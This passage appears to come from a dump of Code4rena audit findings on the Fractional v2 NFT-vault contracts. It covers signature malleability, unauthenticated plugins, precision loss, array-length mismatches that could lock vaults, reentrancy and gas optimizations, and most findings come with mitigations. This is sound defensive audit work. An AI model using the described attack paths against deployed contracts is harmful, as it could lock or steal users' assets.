(https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L206) At least that is what I would imagine after reading the documentation (\"If the target price is reached then a buyout can be triggered\") - For the buyout, the documentation does not match the implementation. In the documentation (https://docs.fractional.art/fractional-v2-1/smart-contracts/modules/buyout), it is mentioned that \"If a pool has more than 51% of the total supply after 4 days, ...\". However, 51% are not needed, the buyout actually suceeds with 50.1% in the implementation (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Buyout.sol#L211) - For `FERC1155`, once a signature was given to someone, there is no way to cancel the permission, which can be undesirable. Consider adding a cancel method to the contract (that stores the cancelled signatures). - For `FERC1155`, when a user gives out multiple signatures (to different accounts at the same time), only the first redeem call will succeed (because of the nonce). If the user wants to avoid that and increases the nonces himself (e.g., nonce 1 for user A, nonce 2 for user B), user A has to use the signature before user B, which is undesirable. Consider optimizing the nonce management, e.g. storing all the used nonces (instead of requiring sequential ones). - Because of malleable signatures, it is considered best practice to check for invalid `s` and `v` values, as OpenZeppelin is doing: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5e007871991e4f04e871bf5fb1200668ff16b35f/contracts/utils/cryptography/ECDSA.sol#L142 In `FERC1155.sol`, `ecrecover` is called without these checks. - In `setApprovalFor` (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/FERC1155.sol#L191), only a boolean can be provided. This can be very undesirable for an ERC1155 token where a user might also want to specify an amount for the allowance. Consequently, the approvals are not decreased or reset in `safeTransferFrom`. - `ERC1155` inherits `safeBatchTransferFrom` from Solmate (https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC1155.sol#L78), but `isApproved` is not checked in this function, meaning that someone who got the approval for all the provided ids still cannot call `safeBatchTransferFrom`. Consider also overriding this function and adding the check that all ids are approved as an alternative. - In `ERC1155`, it is possible to set arbitrarily high royalties (even >100%), which does not make sense and leads to wrong values in `royaltyInfo`. Consider adding a limit. - In `ERC1155`, although the royalty is a `uint256` value, the actual granularity for the calculation is very small and only whole percent values can be provided (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/FERC1155.sol#L247). Consider increasing the granularity, e.g. dividing by 10,000. - In `_execute` of `Vault`, returning `success` (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/Vault.sol#L117) is not necessary. The execution will always revert when it was not successful, i.e. there is no way that `sucess` can be false. - `BaseVault` hardcodes the number of hashes to 6 (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/protoforms/BaseVault.sol#L128), which seems to be the number when modules contains `BaseVault` and `BuyoutModule`. However, depending on the modules that are passed, the number of hashes can be greater. Therefore, the array size should be dynamic. - It seems strange to me that there is no authentication for plugins, whereas the whole Merkle Tree authentication system exists for modules. Therefore, if an owner would (accidentally) add a module as a plugin, everyone could call it and the whole module authentication would be circumvented. This also contradicts the sentence \"An NFT within a given Vault cannot be withdrawn unless its modules allow for it.\" in the documentation. An owner can simply add a new plugin and withdraw all tokens (meaning there is a lot of trust in the owner). - There is currently no way to transfer airdrops (e.g., ERC20 tokens that are distributed to all holders of a NFT) out of a `Vault` without starting a migration. Consider adding a module that would allow to transfer them. - The WETH address (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/utils/SafeSend.sol#L12) is hardcoded, which can make testing and deploying on other networks more difficult. Consider making the address configurable. - In the documentation, it is mentioned \"These modules are set by the curator upon fractionalization and can be adjusted via governance vote of token holders.\". However, this does not seem to be true. An owner can always set a new merkle root (via `setMerkleRoot`) which allows new modules. - An attacker could call `createInCollection` with some malicious tokens that he created (conforming to the FERC1155 calls) and therefore create a vault with a malicous, worthless tokens. He could then sell those tokens and for normal users it would appear as if they are normal fractionalization tokens of a vault. - It seems strange to me to have a functionality (`createInCollection`) for creating a new vault with an existing token. This could result in some scenarios that are undesired. For example, when a buyout is active for both vaults, there is an arbitrage opportunity (buy the tokens with the lower price, sell the ones with the higher) and the person that initiated the one with the lower price will not succeed, although it might have (because people would have been willing to sell at this price) when only vault with this token had existed. "}, {"title": "Users can lose fractions to precision loss during migraction if _newFractionSupply is set very low", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/137", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99   # Vulnerability details  # Vulnerability details  ## Impact Precision loss causing loss of user value and potentially cause complete loss to vault  ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L471-L472  If the supply of the fraction is set to say 10 then any user that uses migrateFractions with less than 10% of the contributions will receive no shares at all due to precision loss. Under certain conditions it may even cause complete loss of access to the vault. In this same example, if less than 5 fractions can be redeemed (i.e. not enough people have more than 10% to overcome the precision loss) then the vault would never be able to be bought out and the vault would forever be frozen.  ## Tools Used  ## Recommended Mitigation Steps When calling propose require that _newFractionSupply is greater than some value (i.e. 1E18)  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# 2022-07-fractional ## Gas Optimisations Report  ### FUNCTIONS GUARANTEED TO REVERT WHEN CALLED BY NORMAL USERS CAN BE MARKED PAYABLE If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  _There are **9** instances of this issue:_  ```solidity File: /src/Vault.sol  24:    function init() external { 25:         if (nonce != 0) revert Initialized(owner, msg.sender, nonce);   73:    function install(bytes4[] memory _selectors, address[] memory _plugins) 74:        external 75:    { 76:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   86:    function setMerkleRoot(bytes32 _rootHash) external { 87:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   93:    function transferOwnership(address _newOwner) external { 94:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   101:   function uninstall(bytes4[] memory _selectors) external { 102:       if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L24  ```solidity File: /src/FERC1155.sol  198:   function setContractURI(string calldata _uri) external onlyController {  205:   function setMetadata(address _metadata, uint256 _id) 206:       external 207:       onlyController   217:   function setRoyalties( 218:       uint256 _id, 219:       address _receiver, 220:       uint256 _percentage 221:   ) external onlyController {   229:   function transferController(address _newController) 230:       external 231:       onlyController ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L198  ### `PUBLIC` FUNCTIONS NOT CALLED BY THE CONTRACT SHOULD BE DECLARED `EXTERNAL` INSTEAD Contracts are allowed to override their parents\u2019 functions and change the visibility from `external` to `public` and can save gas by doing so.  _There are **8** instances of this issue:_  ```solidity File: /src/FERC1155.sol  256:   function safeTransferFrom( 257:       address _from, 258:       address _to, 259:       uint256 _id, 260:       uint256 _amount, 261:       bytes memory _data 262:   ) public override(ERC1155, IFERC1155) {   291:   function uri(uint256 _id) 292:       public 293:       view 294:       override(ERC1155, IFERC1155) 295:       returns (string memory) ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L256-L262  ```solidity File: /src/utils/MerkleBase.sol  43:    function verifyProof( 44:        bytes32 _root, 45:        bytes32[] memory _proof, 46:        bytes32 _valueToProve 47:    ) public pure returns (bool) {   61:    function getRoot(bytes32[] memory _data) public pure returns (bytes32) {   73:    function getProof(bytes32[] memory _data, uint256 _node) 74:        public 75:        pure 76:        returns (bytes32[] memory) ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L43-L47  ```solidity File: /src/utils/Metadata.sol  36:    function uri(uint256 _id) public view returns (string memory) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Metadata.sol#L36  ```solidity File: /src/utils/SelfPermit.sol  18:    function selfPermit( 19:        address _token, 20:        uint256 _id, 21:        bool _approved, 22:        uint256 _deadline, 23:        uint8 _v, 24:        bytes32 _r, 25:        bytes32 _s 26:    ) public {   46:    function selfPermitAll( 47:        address _token, 48:        bool _approved, 49:        uint256 _deadline, 50:        uint8 _v, 51:        bytes32 _r, 52:        bytes32 _s 53:    ) public { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/SelfPermit.sol#L18-L26  ### \\<ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP The overheads outlined below are PER LOOP, excluding the first loop - storage arrays incur a Gwarmaccess (100 gas) - memory arrays use `MLOAD` (3 gas) - calldata arrays use `CALLDATALOAD` (3 gas) \\ \\ Caching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset  _There are **8** instances of this issue:_    ```solidity File: /src/modules/Buyout.sol  454:   for (uint256 i; i < permissions.length; ) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L454  ```solidity File: /src/modules/protoforms/BaseVault.sol  64:    for (uint256 i = 0; i < _tokens.length; ) {  83:    for (uint256 i = 0; i < _tokens.length; ) {  107:   for (uint256 i = 0; i < _tokens.length; ++i) {  130:   for (uint256 i; i < _modules.length; ++i) {  132:   for (uint256 j; j < leaves.length; ++j) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L64  ```solidity File: /src/utils/MerkleBase.sol  51:    for (uint256 i = 0; i < _proof.length; ++i) {  110:   for (uint256 i; i < result.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L51    ### USING > 0 COSTS MORE GAS THAN != 0 WHEN USED ON A UINT This change saves 6 gas per comparison  _There is **1** instance of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  186:    while (x > 0) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L186  ### RETURN DIRECTLY INSTEAD OF STORING A RETURN MEMORY VARIABLE  _There are **5** instances of this issue:_    ```solidity File: /src/Vault.sol  53:    ) external payable returns (bool success, bytes memory response) {            ... 67:        (success, response) = _execute(_target, _data); ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L53    ```solidity File: /src/Vault.sol  55:    ) external returns (address vault) { 56:        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);     87:    ) external returns (address vault, address token) { 88:        (vault, token) = createCollectionFor(       107:   ) external returns (address vault) {            ... 111:       vault = _deployVault(_merkleRoot, _token, _plugins, _selectors);  ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/VaultRegistry.sol#L55-L56    ```solidity File: /src/Vault.sol  181:   returns (bool started)            ... 212:       started = true; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L181     ### EXPRESSIONS FOR CONSTANT VALUES SUCH AS A CALL TO `KECCAK256()`, SHOULD USE `IMMUTABLE` RATHER THAN `CONSTANT` It is expected that the value should be converted into a constant value at compile time. But actually the expression is re-calculated each time the constant is referenced.    _There are **3** instances of this issue:_    ```solidity File: /src/constants/Permit.sol  5:     bytes32 constant DOMAIN_TYPEHASH = keccak256( 6:         \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\" 7:     );     10:    bytes32 constant PERMIT_TYPEHASH = keccak256( 11:        \"Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)\" 12:    );     15:    bytes32 constant PERMIT_ALL_TYPEHASH = keccak256( 16:        \"PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)\" 17:    ); ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/constants/Permit.sol#L5  ### Replace `x <= y` with `x < y + 1` In the EVM, there is no opcode for `>=` or `<=`. When using less than or equal, two operations are performed: `<` and `=`. Using strict comparison operators hence saves gas    _There is **1** instance of this issue:_    ```solidity File: /src/modules/Buyout.sol  203:   if (block.timestamp <= endTime) ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L203                                       ### STATE VARIABLES ONLY SET IN THE CONSTRUCTOR SHOULD BE DECLARED `IMMUTABLE` Avoids a Gsset (20000 gas)  _There are **8** instances of this issue:_  ```solidity File: /src/VaultFactory.sol  15:    address public implementation; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/VaultFactory.sol#L15    ```solidity File: /src/modules/Buyout.sol  29:    address public registry;                                       31:    address public supply;                                       33:    address public transfer; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L29                                      ```solidity File: /src/modules/Migration.sol  37:    address payable public buyout;                                       39:    address public registry; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L37    ```solidity File: /src/modules/Minter.sol  14:    address public supply; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L14                                       ```solidity File: /src/modules/protoforms/BaseVault.sol  19:    address public registry; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L19   ### `X += Y`/`X -= Y` COSTS MORE GAS THAN `X = X + Y`/`X = X - Y`                                       _There are **15** instances of this issue:_                                    ```solidity File: /src/FERC1155.sol  62:    totalSupply[_id] -= _amount;  86:    totalSupply[_id] += _amount;  270:   balanceOf[_from][_id] -= _amount;  271:   balanceOf[_to][_id] += _amount; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L62                                  ```solidity File: /src/modules/Buyout.sol  139:   buyoutInfo[_vault].ethBalance -= ethAmount;  176:   buyoutInfo[_vault].ethBalance += msg.value; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L139                              ```solidity File: /src/modules/Migration.sol  123:   proposal.totalEth += msg.value;  124:   userProposalEth[_proposalId][msg.sender] += msg.value;  134:   proposal.totalFractions += _amount;  135:   userProposalFractions[_proposalId][msg.sender] += _amount;  156:   proposal.totalFractions -= amount;  160:   proposal.totalEth -= ethAmount;  497:   treeLength += IModule(_modules[i]).getLeafNodes().length; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L123                         ```solidity File: /src/utils/MerkleBase.sol  147:   for (uint256 i; i < length - 1; i += 2) {  190:   ceil -= pOf2; // see above ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L147     ### DEFAULT VALUE INITIALIZATION If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    _There are **6** instances of this issue:_    ```solidity File: /src/Vault.sol  78:    for (uint256 i = 0; i < length; i++) {  104:   for (uint256 i = 0; i < length; i++) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78    ```solidity File: /src/modules/protoforms/BaseVault.sol  64:    for (uint256 i = 0; i < _tokens.length; ) {  83:    for (uint256 i = 0; i < _tokens.length; ) {    107:   for (uint256 i = 0; i < _tokens.length; ++i) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L64    ```solidity File: /src/utils/MerkleBase.sol  51:    for (uint256 i = 0; i < _proof.length; ++i) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L51  ### MULTIPLICATION/DIVISION BY TWO SHOULD USE BIT SHIFTING `x * 2` is equivalent to `x << 1` and `x / 2` is the same as `x >> 1`. The `MUL` and `DIV` opcodes cost 5 gas, whereas `SHL` and `SHR` only cost 3 gas  _There are **3** instances of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  100:   _node = _node / 2;  136:   result = new bytes32[](length / 2 + 1);    142:   result = new bytes32[](length / 2); ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L100  ### `REQUIRE()`/`REVERT()` STRINGS LONGER THAN 32 BYTES COST EXTRA GAS    _There are **2** instances of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  62:    require(_data.length > 1, \"wont generate root for single leaf\");  78:    require(_data.length > 1, \"wont generate proof for single leaf\"); ```                               Use shorter error string message.    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L62    ### USE CUSTOM ERRORS RATHER THAN REVERT()/REQUIRE() STRINGS Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information  _There are **5** instances of this issue:_    ```solidity File: /src/FERC1155.sol  263:   require( 264:       msg.sender == _from || 265:           isApprovedForAll[_from][msg.sender] || 266:           isApproved[_from][msg.sender][_id], 267:       \"NOT_AUTHORIZED\" 268:   );     275:   require( 276:       _to.code.length == 0 277:           ? _to != address(0) 278:           : INFTReceiver(_to).onERC1155Received( 279:               msg.sender, 280:               _from, 281:               _id, 282:               _amount, 283:               _data 284:           ) == INFTReceiver.onERC1155Received.selector, 285:       \"UNSAFE_RECIPIENT\" 286:   );      297:   require(metadata[_id] != address(0), \"NO METADATA\"); ```                               https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L263    ```solidity File: /src/utils/MerkleBase.sol  62:    require(_data.length > 1, \"wont generate root for single leaf\");  78:    require(_data.length > 1, \"wont generate proof for single leaf\"); ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L62  ### `INTERNAL` and `PRIVATE` FUNCTIONS ONLY CALLED ONCE CAN BE INLINED TO SAVE GAS Not inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.    _There are **4** instances of this issue:_    ```solidity File: /src/Vault.sol    142:   function _revertedWithReason(bytes memory _response) internal pure { ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L137    ```solidity File: /src/utils/Multicall.sol    39:    function _revertedWithReason(bytes memory _response) internal pure { ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L25    ```solidity File: /src/utils/Multicall.sol    324:   function _computePermitStructHash(    350:   function _computePermitAllStructHash( ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L113 https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L159  ### USING `PRIVATE`/`INTERNAL` RATHER THAN `PUBLIC` FOR `CONSTANT`S SAVES GAS If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table      _There are **6** instances of this issue:_  ```solidity File: /src/FERC1155.sol    15:    string public constant NAME = \"FERC1155\";    17:    string public constant VERSION = \"1\"; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#324  ```solidity File: /src/modules/Buyout.sol    35:    uint256 public constant PROPOSAL_PERIOD = 2 days;    37:    uint256 public constant REJECTION_PERIOD = 4 days; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L35  ```solidity File: /src/modules/Migration.sol    43:    uint256 public constant PROPOSAL_PERIOD = 7 days; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L43  ```solidity File: /src/utils/SafeSend.sol    11:    address payable public constant WETH_ADDRESS = 12:        payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/SafeSend.sol#L11-L12     ### USE LITERAL ARRAYS INSTEAD OF CREATING AN ARRAY WITH SINGLE ITEM    _There are **2** instances of this issue:_    ```solidity File: /src/modules/Minter.sol    - 24:    function getLeafNodes() external view returns (bytes32[] memory nodes) { - 25:        nodes = new bytes32[](1); - 26:        nodes[0] = keccak256(abi.encode(getPermissions()[0])); - 27:    }    + 24:    function getLeafNodes() external view returns (bytes32[] memory) { + 25:        return [keccak256(abi.encode(getPermissions()[0]))]; + 26:    } ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L25    ```solidity File: /src/modules/Minter.sol  - 32:    function getPermissions() - 33:        public - 34:        view - 35:        returns (Permission[] memory permissions) - 36:    { - 37:        permissions = new Permission[](1); - 38:        permissions[0] = Permission( - 39:            address(this), - 40:            supply, - 41:            ISupply.mint.selector - 42:        ); - 43:    }    + 32:    function getPermissions() public view returns (Permission[] memory) { + 33:        return [Permission(address(this), supply, ISupply.mint.selector)]; + 34:    } ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L37  ### PREFIX INCREMENTS ARE CHEAPER THAN POSTFIX INCREMENTS `++I` costs less gas than `I++`, especially when it's used in for-loops (`--I`/`I--` too). Saves 6 gas per instance    _There are **3** instances of this issue:_    ```solidity File: /src/Vault.sol    78:    for (uint256 i = 0; i < length; i++) {                                       104:   for (uint256 i = 0; i < length; i++) { ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78    ```solidity File: /src/utils/MerkleBase.sol    188:   ceil++; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L188  ### ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas **per loop**    _There are **2** instances of this issue:_    ```solidity File: /src/Vault.sol    78:    for (uint256 i = 0; i < length; i++) {                                        104:   for (uint256 i = 0; i < length; i++) { ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78 "}, {"title": "Migration can permanently fail if user specifies different lengths for `selectors` and `plugins`", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/115", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L174   # Vulnerability details  ## Impact In `propose()` in Migration.sol, there is no check that the lengths of the `selectors` and `plugins` arrays are the same. This means that if a migration is successful, the `install()` function in Vault.sol could revert beacuse we access an array out of bounds. This prevents a new vault being created thereby permanently locking assets inside the vault.  ## Proof of Concept 1. user starts a new migration proposal where `selectors.length != plugins.length` 2. enough users join proposal and the buyout bid starts 3. buyout bid is successful and migration starts with `settleVault()` 4. a new vault is cloned with `create()` -> `registry.deployFor()` -> `vault.install(selectors, plugins)` 5. a. If `selectors.length > plugins.length` then we get an out of bounds error and transaction reverts     b. If `selectors.length < plugins.length` then the excess values in `plugins` is ignored which is tolerable 6. In scenario a., the migration fails and a new migration cannot start so assets in the vault are permanently locked  This may seem quite circumstantial as this problem only occurs if a user specifies `selectors` and `plugins` wrongly however it is very easy for an attacker to perform this maliciously with no cost on their behalf, it is highly unlikely that users will be able to spot a malicious migration.  ## Tools Used VS Code ## Recommended Mitigation Steps Consider adding a check in `propose()` to make sure that the lengths match i.e. ```solidity function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // @Audit Make sure that selectors and plugins match         require(_selectors.length == _plugins.length, \"Plugin lengths do not match\");         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if buyout state is not inactive         (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current);          // Initializes migration proposal info         Proposal storage proposal = migrationInfo[_vault][++nextId];         proposal.startTime = block.timestamp;         proposal.targetPrice = _targetPrice;         proposal.modules = _modules;         proposal.plugins = _plugins;         proposal.selectors = _selectors;         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ```  Additionally, I would suggest adding such a check in the `install()` function as this may prevent similiar problems if new modules are added  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "- [Low](#low)     - [**1. Packages with vulnerabilities**](#1-packages-with-vulnerabilities)     - [**2. Outdated compiler**](#2-outdated-compiler)     - [**3. Unsafe ERC20 calls**](#3-unsafe-erc20-calls)     - [**4. Lack of ACK during owner change**](#4-lack-of-ack-during-owner-change)     - [**5. Lack of nonReentrant in Buyout and Migration**](#5-lack-of-nonreentrant-in-buyout-and-migration)     - [**6. Lock ether**](#6-lock-ether)     - [**7. Complex fallback**](#7-complex-fallback) - [Non-Critical](#non-critical)     - [**8. Outdated packages**](#8-outdated-packages)     - [**9. Lack of checks**](#9-lack-of-checks)     - [**10. Open TODO**](#10-open-todo)     - [**11. Use abstract for base contracts**](#11-use-abstract-for-base-contracts)     - [**12. install allows uninstall**](#12-install-allows-uninstall)     - [**13. Contracts with functions without auth that can produce economic losses**](#13-contracts-with-functions-without-auth-that-can-produce-economic-losses)     - [**14. Improve propose method design**](#14-improve-propose-method-design)  # Low  ## **1. Packages with vulnerabilities**  The project contains packages that urgently need to be updated because they contain important vulnerabilities.  `npm audit`:  ``` 54 vulnerabilities (11 moderate, 40 high, 3 critical) ```  ## **2. Outdated compiler**  The pragma version used is:  ``` pragma solidity 0.8.13; ```  But recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  ## **3. Unsafe ERC20 calls**  The following code doesn't check the result of the ERC20 calls. ERC20 standard specify that the token can return false if these calls fails, so it's mandatory to check the result of these ERC20 methods.  Reference:  - [EIP-20](https://eips.ethereum.org/EIPS/eip-20) > NOTES: The following specifications use syntax from Solidity 0.4.17 (or above). Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!  Affected source code for `transfer`:  ```diff function ERC20Transfer(     address _token,     address _to,     uint256 _value ) external { -   IERC20(_token).transfer(_to, _value); +   require(IERC20(_token).transfer(_to, _value)); } ```  - [TransferReference.sol#L22](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/TransferReference.sol#L22) - [SafeSend.sol#L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SafeSend.sol#L33)  Affected source code for `transferFrom`:  - [BaseVault.sol#L65](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L65)  ## **4. Lack of ACK during owner change**  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [Vault.sol#L93](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) - [FERC1155.sol#L234](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L234)  ## **5. Lack of `nonReentrant` in `Buyout` and `Migration`**  **ERC1155** tokens incorporate the ability to react to a transfer using the `onERC1155Received` method on the receiver. And in the `Buyout` contract there is an alteration of the states after the call to `safeTransferFrom`, so a reentry is possible.  ```javascript IERC1155(token).safeTransferFrom(     address(this),     msg.sender,     id,     _amount,     \"\" ); // Updates ether balance of pool buyoutInfo[_vault].ethBalance += msg.value; ```   In the `end` method, you play with fire by sending ether after the transfer, saving the reentrancy by deleting the `buyoutInfo[_vault];`  > *Safe Transfer Rules* > To be more explicit about how the standard safeTransferFrom and safeBatchTransferFrom functions MUST operate with respect to the ERC1155TokenReceiver hook functions, a list of scenarios and rules follows.  The definition of the `burn` method of an **ERC1155** is as follows:  > A contract **MAY** skip calling the ERC1155TokenReceiver hook function(s) if the mint operation is transferring the token(s) to itself. In all other cases the ERC1155TokenReceiver rules MUST be followed as appropriate for the implementation (i.e. safe, custom and/or hybrid).  Reference:  - https://eips.ethereum.org/EIPS/eip-1155#erc-1155-token-receiver  So some implementations that follow the standard of an **ERC1155** could also trigger a reentrancy.  In the case of the `settleFractions` method of the `Migration` contract, **reentrancy is possible since the `fractionsMigrated` flag is set after minting**, which would allow the contract to be minted multiple times, however the receiver of the `ERC1155TokenReceiver` event is ` address(this)` and is considered non-exploitable.  Under 